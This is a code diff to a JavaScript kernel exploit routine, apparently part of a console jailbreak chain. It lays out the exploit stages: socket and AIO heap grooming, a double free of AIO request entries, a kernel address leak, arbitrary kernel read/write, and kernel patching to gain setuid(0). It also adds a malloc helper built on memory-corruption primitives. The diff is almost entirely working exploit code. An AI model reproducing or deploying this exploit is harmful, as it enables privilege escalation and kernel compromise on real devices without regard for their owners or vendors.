@@ -1381,53 +1381,102 @@ function setup(block_fd) {
 }
 
 export async function kexploit() {
-  const init_t1 = performance.now();
+  const _init_t1 = performance.now();
   await init();
-  const init_t2 = performance.now();
+  const _init_t2 = performance.now();
 
-  if (sysi("setuid", 0) === 0) {
-    log("Kernel already patched");
-    return true;
+  try {
+    if (sysi("setuid", 0) == 0) {
+      log("kernel already patched, skipping kexploit");
+      return true;
+    }
+  } catch {
+    // Expected when not in an exploited state
   }
 
   const main_mask = new Long();
   get_our_affinity(main_mask);
+  log(`main_mask: ${main_mask}`);
+
+  log(`pinning process to core #${main_core}`);
   set_our_affinity(new Long(1 << main_core));
+  get_our_affinity(main_mask);
+  log(`main_mask: ${main_mask}`);
+
+  log("setting main thread's priority");
   sysi("rtprio_thread", RTP_SET, 0, rtprio.addr);
 
-  const unix_pair = new View4(2);
-  sysi("socketpair", AF_UNIX, SOCK_STREAM, 0, unix_pair.addr);
-  const [block_fd, unblock_fd] = unix_pair;
-  const sds = Array(num_sds).fill().map(new_socket);
+  const [block_fd, unblock_fd] = (() => {
+    const unix_pair = new View4(2);
+    sysi("socketpair", AF_UNIX, SOCK_STREAM, 0, unix_pair.addr);
+    return unix_pair;
+  })();
 
-  let block_id, groom_ids;
+  const sds = [];
+  for (let i = 0; i < num_sds; i++) {
+    sds.push(new_socket());
+  }
+
+  let block_id = null;
+  let groom_ids = null;
   try {
+    log("STAGE: Setup");
     [block_id, groom_ids] = setup(block_fd);
+
+    log("\nSTAGE: Double free AIO queue entry");
     const sd_pair = double_free_reqs2(sds);
+
+    log("\nSTAGE: Leak kernel addresses");
     const [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf] = leak_kernel_addrs(sd_pair);
+
+    log("\nSTAGE: Double free SceKernelAioRWRequest");
     const [pktopts_sds, dirty_sd] = double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd_pair[0], sds);
+
+    log("\nSTAGE: Get arbitrary kernel read/write");
     const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
+
+    log("\nSTAGE: Patch kernel");
     await patch_kernel(kbase, kmem, p_ucred, restore_info);
   } finally {
     close(unblock_fd);
-    close(block_fd);
-    if (groom_ids) free_aios(groom_ids.addr, groom_ids.length, false);
-    if (block_id) {
-      aio_multi_wait(block_id.addr, 1);
-      aio_multi_delete(block_id.addr, 1);
-    }
-    sds.forEach(close);
 
     const t2 = performance.now();
-    log(`Total time: ${(t2 - t1) / 1000}s, Init: ${(init_t2 - init_t1) / 1000}s, Exploit: ${(t2 - init_t2) / 1000}s`);
+    const ftime = t2 - t1;
+    const init_time = _init_t2 - _init_t1;
+    log(`\ntime (include init): ${ftime / 1000}`);
+    log(`kex time: ${(t2 - _init_t2) / 1000}`);
+    log(`init time: ${init_time / 1000}`);
+    log(`time to init: ${(_init_t1 - t1) / 1000}`);
+    log(`time - init time: ${(ftime - init_time) / 1000}`);
+  }
+  close(block_fd);
+  free_aios2(groom_ids.addr, groom_ids.length);
+  aio_multi_wait(block_id.addr, 1);
+  aio_multi_delete(block_id.addr, block_id.length);
+  for (const sd of sds) {
+    close(sd);
   }
 
-  if (sysi("setuid", 0) === 0) {
-    log("Kernel exploit succeeded!");
-    return true;
+  log("setuid(0)");
+  try {
+    if (sysi("setuid", 0) == 0) {
+      log("kernel exploit succeeded!");
+      return true;
+    }
+  } catch {
+    die("kernel exploit failed!");
   }
-  die("Kernel exploit failed!");
+
+  return false;
 }
+
+const malloc = (sz) => {
+  const backing = new Uint8Array(0x10000 + sz);
+  nogc.push(backing);
+  const ptr = mem.readp(mem.addrof(backing).add(0x10));
+  ptr.backing = backing;
+  return ptr;
+};
 
 const malloc32 = (sz) => {
   const backing = new Uint8Array(0x10000 + sz * 4);
